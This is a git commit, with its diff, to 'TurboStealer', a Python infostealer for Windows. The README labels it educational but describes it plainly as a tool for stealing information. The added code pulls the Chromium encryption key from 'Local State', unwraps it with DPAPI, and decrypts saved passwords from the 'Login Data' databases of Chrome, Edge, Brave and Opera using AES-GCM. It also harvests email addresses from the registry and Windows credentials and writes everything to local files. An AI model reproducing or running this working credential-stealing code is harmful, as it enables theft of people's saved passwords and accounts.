8d188b043ba780c251acb540ab0876eb7e75a219
Alex <panitroll33@gmail.com>
2024-12-01 18:46:29 +0100

    added support for stealing accounts
    - can now decrypts chromium browsers passwords
    - removed SearchMode
    - added Target to select what to steal (mails, accounts or both)

--- README.md
+++ README.md
@@ -1,31 +1,58 @@
-# Disclaimer
-
-For **educational purposes** only, this repository shows people how insecure some information is in our computers and wants to spread awareness.  
-
 # TurboStealer
 
-Command line app that steals information from the user. Currently, only emails can be stolen.
+For **educational purposes** only, this app aims to spread awareness about how insecure some information is in our computers.  
+
+**TurboStealer** is a command line application programmed in python that is able to steal information from the computer running it. Currently, it is capable of stealing:
+- **Emails** from:  
+  - Windows registry
+  - Windows credentials
+  - Chromium based browsers
+- **Usernames and passwords** from:  
+  - Chromium based browsers
 
 # Usage
 
-Just open **TurboStealer.exe** and a file containing the stolen information will be created.
+1. Open **TurboStealer.exe**
+1. A file containing the stolen information will be created.
 
 # Settings
 
-Some settings can be changed by using command line arguments:
+Some settings can be changed using command line arguments:  
 
-- ```m``` or ```mode```:  
-Changes the mode that is used to search for emails.  
-**Example:** ```TurboStealer.exe mode=fast```  
-  - ```f``` or ```fast```:  
-  Sets the mode to fast. In this mode, if a method finds an email it will stop.
-  - ```c``` or ```complete``` ***default***:  
-  Sets the mode to complete. In this mode all methods will be used.
+- ```t```, ```target``` or ```targets```:  
+  Changes the kind of information **TurboStealer** looks for. Multiple values can be selected by separating them with comas.  
+
+  **Values:**  
+  - ```m```, ```mail``` or ```mails```:  
+  Enables looking for emails.
+  - ```a```, ```account``` or ```accounts```:  
+  Enables looking for usernames and passwords.
+
+  **Default value:**  
+  - ```mail,account```  
+
+  **Examples of use:**  
+  - ```TurboStealer.exe targets=mails```:  
+  Only searches for emails.  
+  - ```TurboStealer.exe targets=accounts```:  
+  Only searches for accounts.  
+  - ```TurboStealer.exe targets=mails,accounts```:  
+  Searches for both emails and accounts.  
 
 - ```s``` or ```save```:  
-Changes the save format that is used to save the emails.  
-**Example:** ```TurboStealer.exe save=text```  
-  - ```t```, ```text``` or ```txt```:  
-  Saves the info in plain text.
-  - ```j``` or ```json``` ***default***:  
-  Saves the info in a JSON file.
+  Changes the file format used to save the information.  
+
+  **Values:**  
+  - ```t```, ```txt``` or ```text```:  
+  Uses a TXT file to save the information.
+  - ```j``` or ```json```:  
+  Uses a JSON file to save the information.
+
+  **Default value:**  
+  - ```json```  
+
+  **Examples of use:**  
+  - ```TurboStealer.exe save=text```:  
+  Uses a TXT file to save the information.
+  - ```TurboStealer.exe save=json```:  
+  Uses a JSON file to save the information.
--- main.py
+++ main.py
@@ -2,11 +2,216 @@ from enum import Enum
 import sys
 import re
 import os
+import json
+import base64
+# Windows registry
 import winreg
+# Windows credentials
 import win32cred      # pywin32
 import win32timezone  # pywin32
-import json
+import win32crypt     # pywin32
+# Chrome passwords
 import sqlite3
+from Cryptodome.Cipher import AES 
+
+
+
+#   /$$$$$$  /$$           /$$                 /$$
+#  /$$__  $$| $$          | $$                | $$
+# | $$  \__/| $$  /$$$$$$ | $$$$$$$   /$$$$$$ | $$
+# | $$ /$$$$| $$ /$$__  $$| $$__  $$ |____  $$| $$
+# | $$|_  $$| $$| $$  \ $$| $$  \ $$  /$$$$$$$| $$
+# | $$  \ $$| $$| $$  | $$| $$  | $$ /$$__  $$| $$
+# |  $$$$$$/| $$|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$
+#  \______/ |__/ \______/ |_______/  \_______/|__/
+
+# Settings
+class Target(Enum):
+  Mails = 0      # Mails
+  Accounts = 1   # Usernames & passwords
+
+class SaveAs(Enum):
+  JSON = 0
+  Text = 1
+
+class Settings:
+  targets = [ Target.Mails, Target.Accounts ]
+  save = SaveAs.JSON
+
+def searching(search):
+  return search in Settings.targets
+
+# Info & settings
+class Info:
+  mails = {}
+  accounts = []
+
+
+
+
+
+
+
+#   /$$$$$$                                                      /$$    
+#  /$$__  $$                                                    | $$    
+# | $$  \ $$  /$$$$$$$  /$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$  /$$$$$$  
+# | $$$$$$$$ /$$_____/ /$$_____/ /$$__  $$| $$  | $$| $$__  $$|_  $$_/  
+# | $$__  $$| $$      | $$      | $$  \ $$| $$  | $$| $$  \ $$  | $$    
+# | $$  | $$| $$      | $$      | $$  | $$| $$  | $$| $$  | $$  | $$ /$$
+# | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$  |  $$$$/
+# |__/  |__/ \_______/ \_______/ \______/  \______/ |__/  |__/   \___/  
+
+# Helpers
+def addAccount(url, username, password):
+  # Fix data
+  url = str(url).replace('\r', '')
+  username = str(username).replace('\r', '')
+  password = str(password).replace('\r', '')
+
+  # No user or password
+  if username == '' or password == '': return
+
+  # Add to list
+  Info.accounts.append({
+    'url': url,
+    'username': username,
+    'password': password
+  })
+
+# Search functions
+def searchChromium():
+  # Not searching for mails or accounts
+  if searching(Target.Mails): 
+    if searching(Target.Accounts):
+      print('Searching chromium browsers for mails and accounts...')
+    else:
+      print('Searching chromium browsers for mails...')
+  elif searching(Target.Accounts):
+    print('Searching chromium browsers for accounts...')
+  else:
+    return
+  
+  # Get appdata folders
+  local = os.getenv('LOCALAPPDATA')
+  roaming = os.getenv('APPDATA')
+
+  # Add mails from all known chromium browsers
+  searchChromiumFromPath(local + '\\Google\\Chrome\\User Data\\')
+  searchChromiumFromPath(local + '\\Microsoft\\Edge\\User Data\\')
+  searchChromiumFromPath(local + '\\BraveSoftware\\Brave-Browser\\User Data\\')
+  searchChromiumFromPath(roaming + '\\Opera Software\\Opera Stable\\User Data\\')
+  searchChromiumFromPath(roaming + '\\Opera Software\\Opera GX Stable\\User Data\\')
+
+def searchChromiumFromPath(path):
+  # Find mail in chromium browser
+  localStatePath = path + 'Local State'
+
+  # Check if local state file exists
+  if not os.path.exists(localStatePath): return
+
+  # Read local state file
+  localState = None
+  try:
+    # Read local state data (json)
+    with open(localStatePath) as f:
+      localState = json.load(f)
+  except Exception as e:
+    # Error -> Return
+    print(f'Error reading local state data: {e}')
+    return
+
+  # Get profiles from local state
+  if not 'profile' in localState: 
+    print(f'Error reading local state profiles: {e}')
+    return
+  profile = localState['profile']
+  if not 'profiles_order' in profile: 
+    print(f'Error reading local state profiles: {e}')
+    return
+  profileNames = profile['profiles_order']
+  if not 'info_cache' in profile: 
+    print(f'Error reading local state profiles: {e}')
+    return
+  profilesData = profile['info_cache']
+
+  # Get secret key to decrypt passwords
+  secretKey = None
+  if (searching(Target.Accounts)):
+    try:
+      # Get key from local state & decode it
+      secretKey = localState['os_crypt']['encrypted_key']
+      secretKey = base64.b64decode(secretKey)
+      # Remove suffix DPAPI & decrypt it
+      secretKey = secretKey[5:]
+      secretKey = win32crypt.CryptUnprotectData(secretKey, None, None, None, 0)[1]
+    except Exception as e:
+      # Error
+      print(f'Error finding encryption key: {e}')
+  
+  # Check profiles
+  for name in profileNames:
+    # Get profile data
+    profileData = profilesData[name]
+
+    # Get profile user name (mail)
+    if searching(Target.Mails) and 'user_name' in profileData: 
+      addMail(profileData['user_name'])
+
+    # Get profile folder
+    profileFolder = path + name + '\\'
+
+    # Searching for mails -> Read preferences file
+    if (searching(Target.Mails)):
+      try:
+        # Read file
+        with open(profileFolder + 'Preferences') as f:
+          # Parse preferences data (json)
+          preferences = json.load(f)
+
+          # Get accounts info
+          if 'account_info' in preferences: 
+            accounts = preferences['account_info']
+
+            # Find mails in accounts
+            for account in accounts:
+              if 'email' in account:
+                addMail(account['email'])
+      except Exception as e:
+        # Error
+        print(f'Error reading preferences file: {e}')
+
+    # Read login data file
+    try:
+      # Connect to database
+      connection = sqlite3.connect(f'file:{profileFolder}Login Data?mode=ro&immutable=1', uri = True)
+
+      # Select logins
+      cursor = connection.cursor()
+      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+      
+      # Loop usernames & save mails
+      for row in cursor.fetchall():
+        # Save mail
+        if (searching(Target.Mails)):
+          addMail(row[1])
+
+        # Save account
+        if (searching(Target.Accounts) and secretKey is not None):
+          # Get ciphertext
+          ciphertext = row[2]
+          # Extract initialisation vector & encrypted password
+          initialisation_vector = ciphertext[3:15]
+          encrypted_password = ciphertext[15:-16]
+          # Build the AES algorithm to decrypt the password
+          cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
+          # Decrypt password and save account
+          addAccount(row[0], row[1], cipher.decrypt(encrypted_password).decode())
+
+      # Close database
+      connection.close()
+    except Exception as e:
+      print(f'Error reading login data file: {e}')
+        
 
 
 
@@ -20,8 +225,8 @@ import sqlite3
 # |__/     |__/ \_______/|__/|__/
 
 # Helpers
-def addMail(mails, mail):
-  # Fix mail
+def addMail(mail):
+  # Fix data
   mail = str(mail).replace('\r', '')
 
   # Not a mail -> Return
@@ -29,177 +234,69 @@ def addMail(mails, mail):
     return
   
   # Add to dictionary
-  if mail in mails:
-    mails[mail] += 1
+  if mail in Info.mails:
+    Info.mails[mail] += 1
   else:
-    mails[mail] = 1
+    Info.mails[mail] = 1
 
 def isMail(mail):
   pattern = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")
   return pattern.match(str(mail))
 
 # Search functions
-class SearchMode(Enum):
-  Fast = 0
-  Complete = 1
+def searchMailInRegistry():
+  # Not searching for mails
+  if not searching(Target.Mails): return
 
-def findMail(mode):
-  # Create mails dictionary
-  mails = {}
-
-  # Look for mails in registry
-  findMailRegistry(mails)
-  if (mode == SearchMode.Fast and len(mails) > 0): 
-    return mails
-
-  # Look for mails in windows credentials
-  findMailCredentials(mails)
-  if (mode == SearchMode.Fast and len(mails) > 0): 
-    return mails
-  
-  # Look for mails in chromium browsers
-  findMailChromium(mails)
-  return mails
-
-def findMailRegistry(mails):
-  # Registry path & array to store mails (subkeys)
-  path = 'Software\\Microsoft\\IdentityCRL\\UserExtendedProperties'
-  folders = []
+  # Current method
+  print('Searching registry for mails...')
 
   # Search the key path subkeys
   try:
     # Open the registry key
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_READ)
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\IdentityCRL\\UserExtendedProperties', 0, winreg.KEY_READ)
     
     # Add all folders to list
     i = 0
     while True:
       try:
-        # Get next folder & add it to the list
-        subkey = winreg.EnumKey(key, i)
-        folders.append(subkey)
+        # Get next subkey & save it
+        addMail(winreg.EnumKey(key, i))
         i += 1
       except OSError:
-        # No more folders
+        # No more subkeys
         break
 
-    # Close the key
+    # Close the registry key
     winreg.CloseKey(key)
 
   except FileNotFoundError:
     # Key does not exist
-    print("Registry key or value not found")
+    print("Registry does not exist")
 
   except PermissionError:
-    # Missing permission to open
-    print("Missing permission to read this key")
+    # Missing permissions to read the key
+    print("Missing permissions to read the key")
 
-  # Create dictionary with valid mails
-  for mail in folders:
-    addMail(mails, mail)
+def searchMailInCredentials():
+  # Not searching for mails
+  if not searching(Target.Mails): return
 
-def findMailCredentials(mails):
-  # Look for mails in windows credentials
+  # Current method
+  print('Searching Windows credentials for mails...')
+
+  # Look for mails in Windows credentials
   try:
-    # Retrieve all credentials
+    # Get all credentials
     credentials = win32cred.CredEnumerate(None, 0)
     
-    # Has credentials -> Loop to find mail
-    if credentials:
-      for cred in credentials:
-        mail = cred.get('UserName', 'N/A')
-        addMail(mails, mail)
-    else:
-      print("No credentials found.")
-
+    # Check credentials for mails
+    for cred in credentials:
+      addMail(cred.get('UserName', 'N/A'))
+  
   except Exception as e:
     # Error
     print(f"Error while reading credentials: {e}")
-
-def findMailChromium(mails):
-  # Get appdata folders
-  local = os.getenv('LOCALAPPDATA')
-  roaming = os.getenv('APPDATA')
-
-  # Add mails from all known chromium browsers
-  findMailChromiumFromPath(mails, local + '\\Google\\Chrome\\User Data\\')
-  findMailChromiumFromPath(mails, local + '\\Microsoft\\Edge\\User Data\\')
-  findMailChromiumFromPath(mails, local + '\\BraveSoftware\\Brave-Browser\\User Data\\')
-  findMailChromiumFromPath(mails, roaming + '\\Opera Software\\Opera Stable\\User Data\\')
-  findMailChromiumFromPath(mails, roaming + '\\Opera Software\\Opera GX Stable\\User Data\\')
-
-def findMailChromiumFromPath(mails, path):
-  # Find mail in chromium browser
-  localState = path + 'Local State'
-
-  # Check if local state file exists
-  if (not os.path.exists(localState)): return
-
-  # Read local state file
-  try:
-    with open(localState) as f:
-      # Parse local state data (json)
-      localStateData = json.load(f)
-      profile = localStateData['profile']
-
-      # Get profile names & data
-      profileNames = profile['profiles_order']
-      profilesData = profile['info_cache']
-      
-      # Loop each profile
-      for name in profileNames:
-        # Get profile data
-        profileData = profilesData[name]
-
-        # Get profile user name (mail)
-        mail = profileData['user_name']
-        addMail(mails, mail)
-
-        # Get profile folder
-        profileFolder = path + name + '\\'
-
-        # Read preferences file
-        try:
-          with open(profileFolder + 'Preferences') as f:
-            # Parse preferences data (json)
-            preferences = json.load(f)
-
-            # Get accounts info
-            accounts = preferences['account_info']
-
-            # Find mails in accounts
-            for account in accounts:
-              mail = account['email']
-              addMail(mails, mail)
-
-        except Exception as e:
-          # Error
-          print(f'Error reading preferences file: {e}')
-
-        # Read login data file
-        try:
-          # Connect to database
-          database = profileFolder + 'Login Data'
-          connection = sqlite3.connect(f'file:{database}?mode=ro&immutable=1', uri = True)
-
-          # Select logins
-          cursor = connection.cursor()
-          cursor.execute('SELECT username_value FROM logins')
-          
-          # Loop usernames & save mails
-          for row in cursor.fetchall():
-            addMail(mails, row[0])
-
-          # Close database
-          connection.close()
-
-        except Exception as e:
-          # Error
-          print(f'Error reading login data file: {e}')
-        
-  except Exception as e:
-    # Error
-    print(f'Error finding chromium profiles: {e}')
 
 
 
@@ -212,64 +309,90 @@ def findMailChromiumFromPath(mails, path):
 # | $$ \/  | $$|  $$$$$$$| $$| $$  | $$
 # |__/     |__/ \_______/|__/|__/  |__/
 
-# Save modes
-class SaveFormat(Enum):
-  JSON = 0
-  Text = 1
-
-# Get arguments & default modes
-args = sys.argv
-searchMode = SearchMode.Complete
-saveFormat = SaveFormat.JSON
-
 # Check arguments
-for i, arg in enumerate(args):
-  # Ignore first argument (file path)
-  if (i == 0): 
-    continue
+for i, arg in enumerate(sys.argv):
+  # Ignore first argument (is the file's path)
+  if (i == 0): continue
 
   # Check if argument is to change a var
-  if (not re.compile(r".+=.+").match(arg)):
-    continue
+  if (not re.compile(r".+=.+").match(arg)): continue
 
   # Get variable & value
   parts = arg.split('=')
   var = parts[0]
   val = parts[1]
 
-  # Check variable to change
+  # Check settings to change
   match var:
-    # Search mode
-    case 'm' | 'mode':
-      match val.lower():
-        case 'f' | 'fast':
-          searchMode = SearchMode.Fast
-        case 'c' | 'complete' | _:
-          searchMode = SearchMode.Complete
+    # Target information
+    case 't' | 'target' | 'targets':
+      Settings.targets = []
+      for target in val.split(','):
+        match target.lower():
+          case 'm' | 'mail' | 'mails':
+            Settings.targets.append(Target.Mails)
+          case 'a' | 'account' | 'accounts':
+            Settings.targets.append(Target.Accounts)
 
     # Save format
     case 's' | 'save':
       match val.lower():
         case 't' | 'text' | 'txt':
-          saveFormat = SaveFormat.Text
+          Settings.save = SaveAs.Text
         case 'j' | 'json' | _:
-          saveFormat = SaveFormat.JSON
+          Settings.save = SaveAs.JSON
 
-# Search mails
-mails = findMail(searchMode)
+# Search info
+print('\n** SEARCHING FOR INFORMATION')
+searchMailInRegistry()
+searchMailInCredentials()
+searchChromium()
 
-# Save mails to file
-match saveFormat:
+# Save info to file
+print('\n** SAVING INFORMATION')
+match Settings.save:
   # Save as JSON
-  case SaveFormat.JSON:
-    file = open('mails.json', 'w')
-    json.dump(mails, file)
-    file.close()
+  case SaveAs.JSON:
+    # Mails
+    if (searching(Target.Mails)):
+      print('Saving mails in mails.json')
+
+      # Save file
+      file = open('mails.json', 'w')
+      json.dump(Info.mails, file)
+      file.close()
+
+    # Accounts
+    if (searching(Target.Accounts)):
+      print('Saving accounts in accounts.json')
+
+      # Save file
+      file = open('accounts.json', 'w')
+      json.dump(Info.accounts, file)
+      file.close()
     
   # Save as TXT
-  case SaveFormat.Text:
-    file = open('mails.txt', 'w')
-    for i, mail in enumerate(mails):
-      file.write(mail + ':' + str(mails[mail]))
-      if (i < len(mails) - 1): file.write('\n')
-    file.close()
+  case SaveAs.Text:
+    # Mails
+    if (searching(Target.Mails)):
+      print('Saving mails in mails.txt')
+
+      # Save file
+      file = open('mails.txt', 'w')
+      for i, mail in enumerate(Info.mails):
+        file.write(mail + '\t' + str(Info.mails[mail]))
+        if (i < len(Info.mails) - 1): 
+          file.write('\n')
+      file.close()
+    
+    # Accounts
+    if (searching(Target.Accounts)):
+      print('Saving accounts in accounts.txt')
+
+      # Save file
+      file = open('accounts.txt', 'w')
+      for i, account in enumerate(Info.accounts):
+        file.write(account['username'] + '\t' + account['password'] + '\t' + account['url'])
+        if (i < len(Info.accounts) - 1): 
+          file.write('\n')
+      file.close()
